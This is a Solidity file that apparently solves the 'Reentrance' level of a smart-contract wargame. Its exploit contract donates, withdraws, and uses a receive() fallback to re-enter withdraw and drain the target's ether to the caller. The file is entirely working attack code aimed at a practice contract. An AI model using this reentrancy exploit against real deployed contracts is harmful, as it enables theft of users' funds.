// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Reentrance.sol";

function playerScript(address instanceAddress) {
    new ReentranceExploit().exploit{value: 0.001 ether}(instanceAddress);
}

contract ReentranceExploit {
    function exploit(address instanceAddress) public payable {
        Reentrance instance = Reentrance(payable(instanceAddress));
        instance.donate{value: msg.value}(address(this));
        instance.withdraw(msg.value);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        Reentrance instance = Reentrance(payable(msg.sender));
        instance.withdraw(msg.value);
    }
}
